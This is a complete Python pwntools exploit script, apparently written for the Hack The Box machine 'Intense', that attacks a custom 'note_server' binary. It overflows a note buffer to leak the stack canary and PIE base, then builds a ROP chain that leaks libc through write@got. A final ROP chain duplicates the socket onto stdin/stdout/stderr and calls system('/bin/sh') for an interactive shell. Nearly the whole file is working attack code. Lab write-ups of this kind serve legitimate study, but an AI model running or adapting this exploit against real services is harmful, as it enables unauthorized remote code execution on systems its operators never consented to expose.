#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
binary = context.binary = ELF('./note_server', checksec=False)
# Libc from server (libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6)
libc = ELF('./libc.so.6', checksec=False)

host = "10.10.10.195" #"intense.htb"

pie_offset = 0xf54 # Offset

# Setup io
def startup(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return remote('localhost', 5001, timeout=5)

def print_logo():
    print("""

  _____         _                                      _____  _            _  _ 
 |_   _|       | |                                    / ____|| |          | || |
   | |   _ __  | |_  ___  _ __   ___   ___   ______  | (___  | |__    ___ | || |
   | |  | '_ \ | __|/ _ \| '_ \ / __| / _ \ |______|  \___ \ | '_ \  / _ \| || |
  _| |_ | | | || |_|  __/| | | |\__ \|  __/           ____) || | | ||  __/| || |
 |_____||_| |_| \__|\___||_| |_||___/ \___|          |_____/ |_| |_| \___||_||_|
  ____            _____  _             ___           __          ____           
 |  _ \          / ____|| |           / _ \         / /         / __ \          
 | |_) | _   _  | |     | |__   _ __ | | | |__  __ / /_    ___ | |  | | ___     
 |  _ < | | | | | |     | '_ \ | '__|| | | |\ \/ /| '_ \  / _ \| |  | |/ __|    
 | |_) || |_| | | |____ | | | || |   | |_| | >  < | (_) ||  __/| |__| |\__ \    
 |____/  \__, |  \_____||_| |_||_|    \___/ /_/\_\ \___/  \___| \____/ |___/    
          __/ |                                                                 
         |___/                                                                  
""")

# Clear num amounts of lines
def clear(num=1):
    for i in range(0,num):
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[K")

# Write data to server
def write_note(io, data):
    # Send command 1 
    io.send("\x01")
    # Send buffer-size (MAX 1 Byte)
    io.send(p8(len(data))) 
    # Send data
    io.send(data)

# Copy note
def copy_note(io, offset, size=0):
    io.send("\x02")
    io.send(p16(offset)) # uint16_t offset;
    io.send(p8(size))

# Show notes or get size amout of the note
def show_note(io, size=0): 
    io.send("\x03")
    if size == 0:    
        data = io.recvall()
    else:
        data = io.recv(size)
    return data

# Leak stack
def leak_stack():
    io = startup()
    clear()
    log.info("Stage 1 - Leaking addresses from stack")
    # Overflow
    [write_note(io, "A"*255) for x in range(4)] #4x255 = 1020
    write_note(io, "A"*4) #1020+4 = 1024
    copy_note(io, 1024, 255) # Copy the next 255 bytes after the buffer (leak stack)
    stack = show_note(io, 1024+255)[1024:] # Leak stack (everything after the 1024 bytes of junk)
    io.close()
    clear()
    return filter_stack(stack)

# Reads stack and returns relevant addresses
def filter_stack(stack):
    # First 8 bytes are junk
    canary = u64(stack[8:16])
    log.success(f"Leaked canary: {hex(canary)}")
    rbp = u64(stack[16:24])
    ret = u64(stack[24:32])
    binary.address = ret - pie_offset
    log.success(f"Got binary base: {hex(binary.address)}")
    return canary, rbp

# Generate and execute the ropchain
def ropchain(io, canary, rbp, rop):
    payload = b"A" * 8 # Junk
    payload += p64(canary)
    payload += p64(rbp)
    payload += bytes(rop)

    # Write 1024 bytes again
    write_note(io, payload + (b"A" * (255 - len(payload)))) # 255
    [write_note(io, b"A"*255) for x in range(3)] #255 + 3x255 = 1020
    write_note(io, b"A"*4) #1020+4 = 1024
    # Copy ropchain to stack
    copy_note(io, 0, len(payload))
    show_note(io, 1024 + len(payload)) # Recv junk

# Leak libc
def leak_libc(canary, rbp):
    io = startup()
    clear()
    log.info("Stage 2 - Leaking libc using ROP")
    rop = ROP(binary)
    clear()
                                  #write address of write@got
    rop.call(binary.plt['write'], [4, binary.got['write']])
    ropchain(io, canary, rbp, rop)
    write = u64(io.recv(8)) # Get leaked address of write
    libc.address = write - libc.sym['write']
    log.success(f"Leaked libc: {hex(libc.address)}")
    io.close()
    clear()

# Ropchain to get a shell
def shell_chain():
    rop = ROP([binary, libc])
    clear()

    rop.dup2(4,0)
    rop.dup2(4,1)
    rop.dup2(4,2)

    binsh = next(libc.search(b'/bin/sh\x00'))
    rop.system(binsh)
    return bytes(rop)

# Get shell
def exploit(canary, rbp):
    log.info("Stage 3 - Using ropchain to get shell")
    io = startup()
    clear()
    ropchain(io, canary,rbp, shell_chain()) # Send ropchain to get shell
    if checkShell(io): # Check if we got shell and go interactive
        io.interactive()
    else:
        raise Exception("Did not get a shell!")

# Check, if we got a shell
def checkShell(shell):
    try:
        shell.sendline("id") # Send id to server
        id = shell.recvline().rstrip().decode() # Receive response

        # Check if we got a valid response
        if "uid=" in id:
            log.success("Got shell as %s!" % id)
            return True # Got shell
        else:
            raise Exception
    except:
        clear(1)
        log.warning("Sees like we did not get a shell! DEBUG: %s" % id)
        return False # Did not get a shell

# Main function
def main(counter=0): 
    try:
        print_logo()
        # Leak canary and rbp
        canary, rbp = leak_stack()
        # Leak libc
        leak_libc(canary, rbp)
        # Get shell
        exploit(canary, rbp)
    except Exception as ex:
        counter += 1
        log.debug(f"Exception: {ex}")
        if counter == 3:
            log.warning("Could not get shell after 3 tries! Exiting...")
            quit()
        main(counter)

if __name__ == "__main__":
    main()